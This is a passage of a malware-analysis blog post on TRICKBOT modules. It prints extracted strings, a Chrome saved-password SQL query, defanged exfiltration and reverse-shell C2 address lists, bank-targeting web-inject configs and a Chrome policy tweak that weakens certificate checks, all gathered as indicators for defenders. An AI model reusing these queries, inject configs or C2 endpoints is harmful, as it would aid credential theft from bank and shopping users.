%SystemRoot%\system32\escaped.exe
%SystemDrive%\escaped.exe
%ADMIN$\escaped.exe
WormShare
%\IPC$
%SystemDrive%\escaped.exe
WantRelease
54.38.127.23
file.inf
&quot;ControlInfoService&quot;
&quot;ControlSystemInfoService&quot;
&quot;ServiceInfoSys&quot;
&quot;TechnoInfoService&quot;
&quot;AdvancedInfoService&quot;
&quot;ServiceInfo&quot;
&quot;InfoService&quot;
&quot;ServiceInfoControl&quot;
</code></pre>
<h2 id="pwgrab64">pwgrab64</h2>
<p>Grabs passwords from various spots, seen here querying Chrome/IE password storage. OSINT reports suggest RDP (CredEnumerateA API ref), VNC and Putty.</p>
<pre><code>Software\Microsoft\Internet Explorer\IntelliForms\Storage2
&lt;moduleconfig&gt;&lt;autostart&gt;yes&lt;/autostart&gt;&lt;all&gt;yes&lt;/all&gt;&lt;needinfo name=&quot;id&quot;/&gt;&lt;needinfo name=&quot;ip&quot;/&gt;&lt;autoconf&gt;&lt;conf ctl=&quot;dpost&quot; file=&quot;dpost&quot; period=&quot;60&quot;/&gt;&lt;/autoconf&gt;&lt;/moduleconfig&gt;
Chrome login db should be copied
Chrome webdata db should be copied
Chrome login db should be copied (copy absent)
Chrome webdata db should be copied (copy absent)
Chrome login db copied
Chrome webdata db copied
Chrome login db copy failure
Chrome webdata db copy failure
Skip Chrome login db copy
Skip Chrome history db copy
Grab_Passwords_Chrome(0)
Grab_Passwords_Chrome(1)
Grab_Passwords_Chrome(2)
\Google\Chrome\User Data\Default\Login Data.bak
Grab_Passwords_Chrome(): Can't open database
select origin_url, username_value, password_value, length(password_value) from logins where blacklisted_by_user = 0
Grab_Passwords_Chrome() success
</code></pre>
<p>decoded dpost config C:\Users*\AppData\Roaming\gpuDriver\Data\pwgrab64_configs</p>
<pre><code class="language-xml">&lt;dpost&gt;
&lt;handler&gt;hxxp[://]186[.]159[.]1[.]217:8082&lt;/handler&gt;
&lt;handler&gt;hxxp[://]186[.]10[.]243[.]70:8082&lt;/handler&gt;
&lt;handler&gt;hxxp[://]75[.]183[.]130[.]158:8082&lt;/handler&gt;
&lt;handler&gt;hxxp[://]186[.]183[.]151[.]194:8082&lt;/handler&gt;
&lt;handler&gt;hxxp[://]181[.]129[.]160[.]10:8082&lt;/handler&gt;
&lt;handler&gt;hxxp[://]181[.]57[.]97[.]138:80&lt;/handler&gt;
&lt;handler&gt;hxxp[://]200[.]21[.]51[.]30:80&lt;/handler&gt;
&lt;handler&gt;hxxp[://]191[.]103[.]252[.]29:80&lt;/handler&gt;
&lt;handler&gt;hxxp[://]200[.]35[.]47[.]199:80&lt;/handler&gt;
&lt;handler&gt;hxxp[://]190[.]152[.]125[.]162:80&lt;/handler&gt;
&lt;handler&gt;hxxp[://]79[.]137[.]119[.]209:443&lt;/handler&gt;
&lt;handler&gt;hxxp[://]216[.]189[.]145[.]231:443&lt;/handler&gt;
&lt;handler&gt;hxxp[://]194[.]5[.]250[.]130:443&lt;/handler&gt;
&lt;handler&gt;hxxp[://]192[.]210[.]152[.]190:443&lt;/handler&gt;
&lt;handler&gt;hxxp[://]195[.]123[.]240[.]31:443&lt;/handler&gt;
&lt;handler&gt;hxxp[://]89[.]46[.]223[.]252:443&lt;/handler&gt;
&lt;/dpost&gt;
</code></pre>
<h2 id="injectdll64">injectDll64</h2>
<p>Used for injecting into banking websites to steal credentials.<br>
Notice how it weakens Chrome Browser via <code>Software\Policies\Google\Chrome\CertificateTransparencyEnforcementDisabledForUrls</code></p>
<blockquote>
<p>Disables enforcing Certificate Transparency requirements to the listed URLs. This policy allows certificates for the hostnames in the specified URLs to not be disclosed via Certificate Transparency. This allows certificates that would otherwise be untrusted, because they were not properly publicly disclosed, to continue to be used, but makes it harder to detect misissued certificates for those hosts.</p>
</blockquote>
<p><a href="https://www.chromium.org/administrators/policy-list-3#CertificateTransparencyEnforcementDisabledForUrls">CertificateTransparencyEnforcementDisabledForUrls</a><br>
You can see this is the main module and purpose of TRICKBOT (steal credentials/data) so this is made up of more configuration files then any other module.</p>
<ol>
<li>DINJ config is used for <strong>ATTACK 1 - Web Injects - Server Side Injections.</strong> A web injection technique which inserts (injects) additional client-side code (e.g. HTML, JavaScript) in the rendered targeted web page.</li>
<li>SINJ config is used for <strong>ATTACK 2 - Web Injects - Web Fakes</strong>. The user is redirected to a similiar looking site hosted on the attackers infrastructure.</li>
<li>DPOST - Data exfiltration IPs.<br>
ref: <a href="https://www.cisecurity.org/white-papers/security-primer-trickbot/">https://www.cisecurity.org/white-papers/security-primer-trickbot/</a>  üëè</li>
</ol>
<pre><code>&lt;moduleconfig&gt;
  &lt;sys&gt;yes&lt;/sys&gt;
  &lt;needinfo name=&quot;id&quot;/&gt;
  &lt;needinfo name=&quot;ip&quot;/&gt;
  &lt;autoconf&gt;
    &lt;conf ctl=&quot;dinj&quot; file=&quot;dinj&quot; period=&quot;20&quot;/&gt;
    &lt;conf ctl=&quot;sinj&quot; file=&quot;sinj&quot; period=&quot;20&quot;/&gt;
    &lt;conf ctl=&quot;dpost&quot; file=&quot;dpost&quot; period=&quot;60&quot;/&gt;
  &lt;/autoconf&gt;
&lt;/moduleconfig&gt;
ascii,81,-,x,Software\Policies\Google\Chrome\CertificateTransparencyEnforcementDisabledForUrls
ascii,81,-,x,Software\Policies\Google\Chrome\CertificateTransparencyEnforcementDisabledForUrls
ascii,81,-,x,Software\Policies\Google\Chrome\CertificateTransparencyEnforcementDisabledForUrls
</code></pre>
<p>Decoded configs<br>
C:\Users*\AppData\Roaming\gpuDriver\Data\injectDll64_configs\dpost</p>
<pre><code class="language-xml">&lt;dpost&gt;
&lt;handler&gt;hxxp[://]186[.]159[.]1[.]217:8082&lt;/handler&gt;
&lt;handler&gt;hxxp[://]186[.]10[.]243[.]70:8082&lt;/handler&gt;
&lt;handler&gt;hxxp[://]75[.]183[.]130[.]158:8082&lt;/handler&gt;
&lt;handler&gt;hxxp[://]186[.]183[.]151[.]194:8082&lt;/handler&gt;
&lt;handler&gt;hxxp[://]181[.]129[.]160[.]10:8082&lt;/handler&gt;
&lt;handler&gt;hxxp[://]181[.]57[.]97[.]138:80&lt;/handler&gt;
&lt;handler&gt;hxxp[://]200[.]21[.]51[.]30:80&lt;/handler&gt;
&lt;handler&gt;hxxp[://]191[.]103[.]252[.]29:80&lt;/handler&gt;
&lt;handler&gt;hxxp[://]200[.]35[.]47[.]199:80&lt;/handler&gt;
&lt;handler&gt;hxxp[://]190[.]152[.]125[.]162:80&lt;/handler&gt;
&lt;handler&gt;hxxp[://]79[.]137[.]119[.]209:443&lt;/handler&gt;
&lt;handler&gt;hxxp[://]216[.]189[.]145[.]231:443&lt;/handler&gt;
&lt;handler&gt;hxxp[://]194[.]5[.]250[.]130:443&lt;/handler&gt;
&lt;handler&gt;hxxp[://]192[.]210[.]152[.]190:443&lt;/handler&gt;
&lt;handler&gt;hxxp[://]195[.]123[.]240[.]31:443&lt;/handler&gt;
&lt;handler&gt;hxxp[://]89[.]46[.]223[.]252:443&lt;/handler&gt;
&lt;/dpost&gt;
</code></pre>
<p>C:\Users*\AppData\Roaming\gpuDriver\Data\injectDll64_configs\sinj<br>
snippet</p>
<pre><code class="language-xml">&lt;sinj&gt;
&lt;mm&gt;hxxps[://]www[.]rbsdigital[.]com*&lt;/mm&gt;
&lt;sm&gt;hxxps[://]www[.]rbsdigital[.]com/default[.]aspx*&lt;/sm&gt;
&lt;nh&gt;cksaynvgcustplhbkjzrdfxaqiom[.]net&lt;/nh&gt;
&lt;url404&gt;&lt;/url404&gt;
&lt;srv&gt;198.46.190.28:443&lt;/srv&gt;
&lt;/sinj&gt;
&lt;sinj&gt;
&lt;mm&gt;hxxps[://]www[.]nwolb[.]com*&lt;/mm&gt;
&lt;sm&gt;hxxps[://]www[.]nwolb[.]com/default[.]aspx*&lt;/sm&gt;
&lt;nh&gt;cqsawlqdxvfyrcbostmkjeuagpzi[.]net&lt;/nh&gt;
&lt;url404&gt;&lt;/url404&gt;
&lt;srv&gt;198.46.190.28:443&lt;/srv&gt;
&lt;/sinj&gt;
&lt;sinj&gt;
&lt;mm&gt;hxxps[://]retail[.]santander[.]co[.]uk*&lt;/mm&gt;
&lt;sm&gt;hxxps[://]retail[.]santander[.]co[.]uk/LOGSUK_NS_ENS/BtoChannelDriver[.]ssobto*&lt;/sm&gt;
&lt;nh&gt;odsakrjtsmyalzxfdpvbgqieowch[.]com&lt;/nh&gt;
&lt;url404&gt;&lt;/url404&gt;
&lt;srv&gt;198.46.190.28:443&lt;/srv&gt;
&lt;/sinj&gt;
&lt;sinj&gt;
...
...
...
...
</code></pre>
<p>C:\Users*\AppData\Roaming\gpuDriver\Data\injectDll64_configs\dinj<br>
snippet</p>
<pre><code class="language-xml">&lt;igroup&gt;
&lt;dinj&gt;
&lt;lm&gt;*.com/SPF/Login/Auth[.]aspx*&lt;/lm&gt;
&lt;hl&gt;hxxp[://]185[.]202[.]174[.]13/response[.]php&lt;/hl&gt;
&lt;pri&gt;100&lt;/pri&gt;
&lt;sq&gt;2&lt;/sq&gt;
&lt;ignore_mask&gt;*.gif*&lt;/ignore_mask&gt;
&lt;ignore_mask&gt;*.jpg*&lt;/ignore_mask&gt;
&lt;ignore_mask&gt;*.png*&lt;/ignore_mask&gt;
&lt;ignore_mask&gt;*.js*&lt;/ignore_mask&gt;
&lt;ignore_mask&gt;*.css*&lt;/ignore_mask&gt;
&lt;require_header&gt;*text/html*&lt;/require_header&gt;
&lt;/dinj&gt;
&lt;dinj&gt;
&lt;lm&gt;*.com/SPF/Login/favicon[.]ico?*&lt;/lm&gt;
&lt;hl&gt;hxxp[://]185[.]202[.]174[.]13/response[.]php&lt;/hl&gt;
&lt;pri&gt;100&lt;/pri&gt;
&lt;sq&gt;2&lt;/sq&gt;
&lt;/dinj&gt;
&lt;dinj&gt;
&lt;lm&gt;*favicon[.]ico=f7caf50483938302d86aa228d161e435*&lt;/lm&gt;
&lt;hl&gt;hxxp[://]185[.]202[.]174[.]13/response[.]php&lt;/hl&gt;
&lt;pri&gt;100&lt;/pri&gt;
&lt;sq&gt;1&lt;/sq&gt;
&lt;/dinj&gt;
&lt;/igroup&gt;
&lt;dinj&gt;
&lt;lm&gt;*amazon.*&lt;/lm&gt;
&lt;hl&gt;hxxps[://]185[.]202[.]174[.]13:446/response[.]php?s=1527163537124692&amp;id=DeJENQHkNQsIpSv5YWb8&lt;/hl&gt;
&lt;pri&gt;100&lt;/pri&gt;
&lt;sq&gt;2&lt;/sq&gt;
&lt;ignore_mask&gt;hxxps[://]www[.]amazon[.]co[.]uk/ap/signin&lt;/ignore_mask&gt;
&lt;ignore_mask&gt;hxxps[://]www[.]amazon[.]co[.]uk/*&lt;/ignore_mask&gt;
&lt;ignore_mask&gt;hxxps[://]www[.]amazon[.]co[.]uk/gp/yourstore/home*&lt;/ignore_mask&gt;
&lt;ignore_mask&gt;hxxps[://]sellercentral[.]amazon[.]com/ap/signin*&lt;/ignore_mask&gt;
&lt;ignore_mask&gt;hxxps[://]sellercentral[.]amazon[.]com/gp/notifications/notification-widget-internals[.]html*&lt;/ignore_mask&gt;
&lt;ignore_mask&gt;*popokai[.]com*&lt;/ignore_mask&gt;
&lt;ignore_mask&gt;*.js*&lt;/ignore_mask&gt;
&lt;ignore_mask&gt;hxxps[://]www[.]amazon[.]de/ap/signin&lt;/ignore_mask&gt;
&lt;ignore_mask&gt;hxxps[://]www[.]amazon[.]ca/ap/signin&lt;/ignore_mask&gt;
&lt;ignore_mask&gt;hxxps[://]www[.]amazon[.]de/gp/yourstore/home*&lt;/ignore_mask&gt;
&lt;ignore_mask&gt;hxxps[://]www[.]amazon[.]ca/gp/yourstore/home*&lt;/ignore_mask&gt;
&lt;ignore_mask&gt;hxxps[://]www[.]amazon[.]ca/*&lt;/ignore_mask&gt;
&lt;ignore_mask&gt;hxxps[://]www[.]amazon[.]de/*&lt;/ignore_mask&gt;
&lt;require_header&gt;*text/html*&lt;/require_header&gt;
&lt;/dinj&gt;
&lt;dinj&gt;
&lt;lm&gt;hxxps[://]www[.]amazon[.]co[.]uk/ap/signin&lt;/lm&gt;
&lt;hl&gt;hxxps[://]185[.]202[.]174[.]13:446/response[.]php?s=1527163537124692&amp;id=sL5FRia9p0kAxzAm7uXQ&lt;/hl&gt;
&lt;pri&gt;100&lt;/pri&gt;
&lt;sq&gt;2&lt;/sq&gt;
&lt;ignore_mask&gt;*popokai[.]com*&lt;/ignore_mask&gt;
&lt;/dinj&gt;
...
...
...
</code></pre>
<p>dinj and sinj are made up of a dozen more banking websites and shopping sites such as Amazon.</p>
<h2 id="importdll64">importDll64</h2>
<p>Browser artefact grabber, form-data, cookies, history. Profiles the installed browser/s via an html/jscript  <a href="https://gist.github.com/sneakymonk3y/4c372ec9b6b90e445c81de7d9ecaffd9">https://gist.github.com/sneakymonk3y/4c372ec9b6b90e445c81de7d9ecaffd9</a></p>
<pre><code>!!&quot;&quot;##$$%%&amp;&amp;''(())**++,,--..//00112233445566778899SQLite format 3
SQLITE_
2017-02-13 16:02:40 ada05cfa86ad7f5645450ac7a2a21c9aa6e57d2c
Looking for %s
%s not found
Browser exec is: %s
 as 
conf.name
conf.grabbed
Getting cookies
attempt %d. Cookies not found
Getting html5 local storage
attempt %d. Local Storage not found
Getting browser history
attempt %d. History not found
Getting flash lso files
basic_string::_M_construct null not valid
InternetExplorer
unsupported OS
SOFTWARE\Microsoft\Internet Explorer\svcVersion
SOFTWARE\Microsoft\Internet Explorer\Version
registry access
Found version %s
Version %d is not supported
/internet explorer/iexplore.exe 
basic_string::_M_construct null not valid
SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders\Cookies
registry cookies path
HTTP/1.1 200 OK
Server: grabber
IE compatible mode grabbing...
Have a nice day
error listenning
Trying browser communication... please wait
magic %d
HiddenDesktop
{URL}
http.userAgent
Success
Could not gather browser data
Compatible mode grabbing is not finished!
127.0.0.1
<a href="/cdn-cgi/l/email-protection" class="__cf_email__" data-cfemail="e0819090928fa08f90858e93938cce8f9287">[email&#160;protected]</a>
http://127.0.0.1
http://www.phreedom.org/md5)
http://bugreports.qt.io/
http://www.openssl.org/support/faq.html
http://www.w3.org/XML/1998/namespace
http://www.w3.org/2000/xmlns/
http://gcc.gnu.org/bugs.html):
C:\temp\qt-common
C:\temp\qt-user
c:\users\root\appdata\local\microsoft\windows\webcache\webcachev01.dat
</code></pre>
<h2 id="vncdll64">vncDll64</h2>
<p>Remote Control - VNC module. Could be similar tooling such as <a href="http://vncproxy.sourceforge.net/proxy.html">http://vncproxy.sourceforge.net/proxy.html</a>.<br>
Outlook is being referenced - not sure if this is more a screen grabbing module for reading emails/security codes?<br>
<img src="https://sneakymonkey.net/content/images/2019/05/vnc-1.png" alt="vnc-1" loading="lazy"></p>
<pre><code>185.172.129[.]11
RSDS/
C:\Users\MaxMikhaylov\Documents\Visual Studio 2010\MMVNC.PROXY\VNCSRV\x64\Release\VNCSRV.pdb
vncsrv.dll
&quot;WinSta0\\AlterDesk01&quot;
&quot; -new -noframemerging http://www.google.com&quot;
&quot;Chrome_WidgetWin&quot;
&quot; --allow-no-sandbox-job --no-sandbox --disable-3d-apis --disable-accelerated-layers --disable-accelerated-plugins --disable-audio --disable-gpu --disable-d3d11 --disable-accelerated-2d-canvas&quot;
&quot;MozillaWindowClass&quot;
&quot; -safe-mode&quot;
&quot; taskschd.msc&quot;
&quot; /K schtasks.exe |more&quot;
&quot;SysListView32&quot;
&quot;IE.HTTP\\shell\\open\\command&quot;
&quot;EDGE\\shell\\open\\command&quot;
&quot;\\shell\\open\\command&quot;
&quot;ChromeHTML&quot;
&quot;FirefoxHTML&quot;
&quot;\\mmc.exe&quot;
&quot;\\cmd.exe&quot;
&quot;\\explorer.exe&quot;
&quot;\\Microsoft Office\\Office16\\outlook.exe&quot;
&quot;\\Microsoft Office\\Office15\\outlook.exe&quot;
&quot;\\Microsoft Office\\Office14\\outlook.exe&quot;
&quot;\\Microsoft Office\\Office12\\outlook.exe&quot;
&quot;\\Microsoft Office\\Office11\\outlook.exe&quot;
</code></pre>
<h2 id="newbctestdll64">newBCtestDll64</h2>
<p>OSINT reports as reverse shell. Will confirm later with network traffic/PCAP analysis.</p>
<pre><code>&lt;moduleconfig&gt;&lt;autostart&gt;yes&lt;/autostart&gt;&lt;sys&gt;yes&lt;/sys&gt;&lt;needinfo name = &quot;id&quot;/&gt;&lt;needinfo name = &quot;ip&quot;/&gt;&lt;autoconf&gt;&lt;conf ctl = &quot;setconf&quot; file = &quot;bcconfig&quot; period = &quot;90&quot;/&gt;&lt;/autoconf&gt;&lt;/moduleconfig&gt;
</code></pre>
<p>decoded config C:\Users*\AppData\Roaming\gpuDriver\Data\NewBCtestDll64_configs</p>
<pre><code class="language-xml">&lt;servers&gt;
&lt;addr&gt;162[.]209[.]124[.]166:80&lt;/addr&gt;
&lt;addr&gt;167[.]99[.]206[.]127:80&lt;/addr&gt;
&lt;addr&gt;199[.]247[.]24[.]9:80&lt;/addr&gt;
 &lt;/servers&gt;
</code></pre>
<h2 id="conclusion">Conclusion:</h2>
<p>Very quickly you can gather IOCs and some basic understanding of the malware. Obviously further analysis on network traffic and stepping through the unpacking of the malware will result in any missed bits of information but requires reverse engineer lv.2 ü•áü•á</p>
<p>TRICKBOT can be a real pain and while doing this research it was even in the <a href="https://www.news5cleveland.com/news/local-news/akron-canton-news/coventry-local-school-district-closed-monday-due-to-trickbot-virus-infecting-school-computers">US news - taking a school offline</a>.<br>
If you do detect a TRICKBOT infection in your environment, the likely hood is with, you have an EMOTET problem too - so one to be aware of and check that out.</p>
<blockquote>
<p>Trickbot normally has its own malspam-based distribution channel, but now Trickbot attackers are also using Emotet for their infections.<br>
<a href="https://unit42.paloaltonetworks.com/unit42-malware-team-malspam-pushing-emotet-trickbot/">https://unit42.paloaltonetworks.com/unit42-malware-team-malspam-pushing-emotet-trickbot/</a></p>
</blockquote>
<blockquote class="twitter-tweet" data-lang="en"><p lang="en" dir="ltr">2019-05-16 - <a href="https://twitter.com/hashtag/Emotet?src=hash&amp;ref_src=twsrc%5Etfw">#Emotet</a> still doing <a href="https://twitter.com/hashtag/Trickbot?src=hash&amp;ref_src=twsrc%5Etfw">#Trickbot</a> as the follow-up malware this week, it seems. <a href="https://t.co/Ozay0p1MhS">pic.twitter.com/Ozay0p1MhS</a></p>&mdash; Brad (@malware_traffic) <a href="https://twitter.com/malware_traffic/status/1129122571075641345?ref_src=twsrc%5Etfw">May 16, 2019</a></blockquote>
<script data-cfasync="false" src="/cdn-cgi/scripts/5c5dd728/cloudflare-static/email-decode.min.js"></script><script async src="https://platform.twitter.com/widgets.js" charset="utf-8"></script>
<p>With the rate of modules being developed by TRICKBOT, understanding the impact it can have on your environment is key for defense. Hopefully this helped you understand the threat TRICKBOT imposes and has spurred you on to look in these various areas to proactively harden what 'TRICK' is looking for to ultimately steal. With the added 'access-as-a-service' which criminal groups are providing nowdays, your TRICK infection might turn into something else. TBC üôàüôàüôà</p>
<h2 id="configsiocs">Configs/IOCs</h2>
<p><a href="https://pastebin.com/wZ3R0gCa">https://pastebin.com/wZ3R0gCa</a><br>
<a href="https://pastebin.com/ghGtMBLH">https://pastebin.com/ghGtMBLH</a></p>
<h2 id="furtheranalysis">Further Analysis:</h2>
<ul>
<li>Network lateral movement analysis (SMB/IPC/EternalBlue/Champion)</li>
<li>Create a script to loop through the modules, decode, complete string analysis and automatically report back diffs.</li>
<li>Network IOCs / PCAP traffic of infection - @malware_traffic does a great job of this already.</li>
<li>Late to the game with this but this looks gold! Unpacking the main config, Open Analysis Live - <a href="https://www.youtube.com/watch?v=EdchPEHnohw">https://www.youtube.com/watch?v=EdchPEHnohw</a></li>
</ul>
<p>Happy to hear any further information I've missed or is key for defenders üòé.</p>
<h3 id="credits">Credits:</h3>
<ul>
<li>@hasherades great <a href="https://www.youtube.com/watch?v=7Txg46Dig9c">Youtube content</a> aswell as the decrypting scripts used üëèüëèüëè</li>
<li>MS-ISAC TRICKBOT Primer March 2019 <a href="https://www.cisecurity.org/wp-content/uploads/2019/03/MS-ISAC-Security-Primer-Trickbot-11March2019-mtw.pdf">https://www.cisecurity.org/wp-content/uploads/2019/03/MS-ISAC-Security-Primer-Trickbot-11March2019-mtw.pdf</a></li>
<li>@malware_traffic <a href="https://www.malware-traffic-analysis.net/2019/04/27/index.html">2019-04-27 TRICKBOT SAMPLE</a></li>
<li>@VK_intel for his blog - <a href="https://www.vkremez.com/2017/09/lets-learn-reversing-trickbot-banking.html">https://www.vkremez.com/2017/09/lets-learn-reversing-trickbot-banking.html</a></li>
<li>@felixw3000's analysis <a href="https://www.uperesia.com/how-trickbot-tricks-its-victims">https://www.uperesia.com/how-trickbot-tricks-its-victims</a></li>
</ul>
<!--kg-card-end: markdown-->
    </section>


</article>
</main>




            <aside class="read-more-wrap outer">
                <div class="read-more inner">
                        
<article class="post-card post featured">

    <a class="post-card-image-link" href="/cloud-credential-abuse/">

        <img class="post-card-image"
            srcset="/content/images/size/w300/2023/01/morpheus-1.jpg 300w,
                    /content/images/size/w600/2023/01/morpheus-1.jpg 600w,
                    /content/images/size/w1000/2023/01/morpheus-1.jpg 1000w,
                    /content/images/size/w2000/2023/01/morpheus-1.jpg 2000w"
            sizes="(max-width: 1000px) 400px, 800px"
            src="/content/images/size/w600/2023/01/morpheus-1.jpg"
            alt="a hot mess of misconfigurations and unkowns"
            loading="lazy"
        />


    </a>

    <div class="post-card-content">

        <a class="post-card-content-link" href="/cloud-credential-abuse/">
            <header class="post-card-header">
                <div class="post-card-tags">
                        <span class="post-card-featured"><svg width="16" height="17" viewBox="0 0 16 17" fill="none" xmlns="http://www.w3.org/2000/svg">
    <path d="M4.49365 4.58752C3.53115 6.03752 2.74365 7.70002 2.74365 9.25002C2.74365 10.6424 3.29678 11.9778 4.28134 12.9623C5.26591 13.9469 6.60127 14.5 7.99365 14.5C9.38604 14.5 10.7214 13.9469 11.706 12.9623C12.6905 11.9778 13.2437 10.6424 13.2437 9.25002C13.2437 6.00002 10.9937 3.50002 9.16865 1.68127L6.99365 6.25002L4.49365 4.58752Z" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"></path>
</svg> Featured</span>
                </div>
                <h2 class="post-card-title">
                    Cloud Metadata - AWS IAM Credential Abuse
                </h2>
            </header>
                <div class="post-card-excerpt">Attackers are already fully aware of what cloud misconfigurations are and how to take advantage. Why would an attacker run 169.254.169[.]254/latest/meta-data/iam/security-credentials/ ?</div>
        </a>

        <footer class="post-card-meta">
            <time class="post-card-meta-date" datetime="2023-01-02">Jan 2, 2023</time>
                <span class="post-card-meta-length">8 min read</span>
        </footer>

    </div>

</article>
                        
<article class="post-card post featured">

    <a class="post-card-image-link" href="/oscp-2020-tips/">

        <img class="post-card-image"
            srcset="/content/images/size/w300/2022/12/offensive_security-logo-black.jpg 300w,
                    /content/images/size/w600/2022/12/offensive_security-logo-black.jpg 600w,
                    /content/images/size/w1000/2022/12/offensive_security-logo-black.jpg 1000w,
                    /content/images/size/w2000/2022/12/offensive_security-logo-black.jpg 2000w"
            sizes="(max-width: 1000px) 400px, 800px"
            src="/content/images/size/w600/2022/12/offensive_security-logo-black.jpg"
            alt="OSCP 2020 Tips"
            loading="lazy"
        />


    </a>

    <div class="post-card-content">

        <a class="post-card-content-link" href="/oscp-2020-tips/">
            <header class="post-card-header">
                <div class="post-card-tags">
                        <span class="post-card-featured"><svg width="16" height="17" viewBox="0 0 16 17" fill="none" xmlns="http://www.w3.org/2000/svg">
    <path d="M4.49365 4.58752C3.53115 6.03752 2.74365 7.70002 2.74365 9.25002C2.74365 10.6424 3.29678 11.9778 4.28134 12.9623C5.26591 13.9469 6.60127 14.5 7.99365 14.5C9.38604 14.5 10.7214 13.9469 11.706 12.9623C12.6905 11.9778 13.2437 10.6424 13.2437 9.25002C13.2437 6.00002 10.9937 3.50002 9.16865 1.68127L6.99365 6.25002L4.49365 4.58752Z" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"></path>
</svg> Featured</span>
                </div>
                <h2 class="post-card-title">
                    OSCP 2020 Tips
                </h2>
            </header>
                <div class="post-card-excerpt">Completed it mate! 269 days later.... dump of my notes and tips from my recent experience after passing the OSCP exam.</div>
        </a>

        <footer class="post-card-meta">
            <time class="post-card-meta-date" datetime="2021-04-15">Apr 15, 2021</time>
                <span class="post-card-meta-length">9 min read</span>
        </footer>

    </div>

</article>
                        
<article class="post-card post">

    <a class="post-card-image-link" href="/excel-4-0-macros-so-hot-right-now/">

        <img class="post-card-image"
            srcset="/content/images/size/w300/2020/06/SoHotRightNow.jpg 300w,
                    /content/images/size/w600/2020/06/SoHotRightNow.jpg 600w,
                    /content/images/size/w1000/2020/06/SoHotRightNow.jpg 1000w,
                    /content/images/size/w2000/2020/06/SoHotRightNow.jpg 2000w"
            sizes="(max-width: 1000px) 400px, 800px"
            src="/content/images/size/w600/2020/06/SoHotRightNow.jpg"
            alt="Excel 4.0 Macros - So hot right now...üî•üî•üî•"
            loading="lazy"
        />


    </a>

    <div class="post-card-content">

        <a class="post-card-content-link" href="/excel-4-0-macros-so-hot-right-now/">
            <header class="post-card-header">
                <div class="post-card-tags">
                </div>
                <h2 class="post-card-title">
                    Excel 4.0 Macros - So hot right now...üî•üî•üî•
                </h2>
            </header>
                <div class="post-card-excerpt">Analysis of Excel 4.0 macros and how to triage these .XLS files to gather IOCs from recent ITW samples such as ZLOADER, TRICKBOT and URSNIF.</div>
        </a>

        <footer class="post-card-meta">
            <time class="post-card-meta-date" datetime="2020-06-22">Jun 22, 2020</time>
                <span class="post-card-meta-length">9 min read</span>
        </footer>

    </div>

</article>
                </div>
            </aside>



    </div>

    <footer class="site-footer outer">
        <div class="inner">
            <section class="copyright"><a href="https://sneakymonkey.net">you sneakymonkey!</a> &copy; 2025</section>
            <nav class="site-footer-nav">
                <ul class="nav">
    <li class="nav-mastodon"><a href="https://infosec.exchange/@sneakymonkey">Mastodon</a></li>
    <li class="nav-twitter"><a href="https://twitter.com/sneakymonk3y">Twitter</a></li>
</ul>

            </nav>
            <div><a href="https://ghost.org/" target="_blank" rel="noopener">Powered by Ghost</a></div>
        </div>
    </footer>

</div>


<script
    src="https://code.jquery.com/jquery-3.5.1.min.js"
    integrity="sha256-9/aliU8dGd2tb6OSsuzixeV4y/faTqgFtohetphbbj0="
    crossorigin="anonymous">
</script>
<script src="/assets/built/casper.js?v=7ce45ed6c5"></script>
<script>
$(document).ready(function () {
    // Mobile Menu Trigger
    $('.gh-burger').click(function () {
        $('body').toggleClass('gh-head-open');
    });
    // FitVids - Makes video embeds responsive
    $(".gh-content").fitVids();
});
</script>

<script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerpolicy="no-referrer"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/plugins/autoloader/prism-autoloader.min.js" integrity="sha512-SkmBfuA2hqjzEVpmnMt/LINrjop3GKWqsuLSSB3e7iBmYK7JuWw4ldmmxwD9mdm2IRTTi0OxSAfEGvgEi0i2Kw==" crossorigin="anonymous" referrerpolicy="no-referrer"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/plugins/line-numbers/prism-line-numbers.min.js" integrity="sha512-BttltKXFyWnGZQcRWj6osIg7lbizJchuAMotOkdLxHxwt/Hyo+cl47bZU0QADg+Qt5DJwni3SbYGXeGMB5cBcw==" crossorigin="anonymous" referrerpolicy="no-referrer"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/plugins/show-language/prism-show-language.min.js" integrity="sha512-d1t+YumgzdIHUL78me4B9NzNTu9Lcj6RdGVbdiFDlxRV9JTN9s+iBQRhUqLRq5xtWUp1AD+cW2sN2OlST716fw==" crossorigin="anonymous" referrerpolicy="no-referrer"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/plugins/toolbar/prism-toolbar.min.js" integrity="sha512-st608h+ZqzliahyzEpETxzU0f7z7a9acN6AFvYmHvpFhmcFuKT8a22TT5TpKpjDa3pt3Wv7Z3SdQBCBdDPhyWA==" crossorigin="anonymous" referrerpolicy="no-referrer"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/plugins/copy-to-clipboard/prism-copy-to-clipboard.min.js" integrity="sha512-/kVH1uXuObC0iYgxxCKY41JdWOkKOxorFVmip+YVifKsJ4Au/87EisD1wty7vxN2kAhnWh6Yc8o/dSAXj6Oz7A==" crossorigin="anonymous" referrerpolicy="no-referrer"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/plugins/show-language/prism-show-language.min.js" integrity="sha512-d1t+YumgzdIHUL78me4B9NzNTu9Lcj6RdGVbdiFDlxRV9JTN9s+iBQRhUqLRq5xtWUp1AD+cW2sN2OlST716fw==" crossorigin="anonymous" referrerpolicy="no-referrer"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/cookieconsent/3.1.1/cookieconsent.min.js" integrity="sha512-yXXqOFjdjHNH1GND+1EO0jbvvebABpzGKD66djnUfiKlYME5HGMUJHoCaeE4D5PTG2YsSJf6dwqyUUvQvS0vaA==" crossorigin="anonymous" referrerpolicy="no-referrer"></script>
<script>
window.cookieconsent.initialise({
  "palette": {
    "popup": {
      "background": "#252e39"
    },
    "button": {
      "background": "#000000"
    }
  },
  "theme": "classic",
  "content": {
    "message": "This website uses cookies (Google Analytics) to track visitor data.",
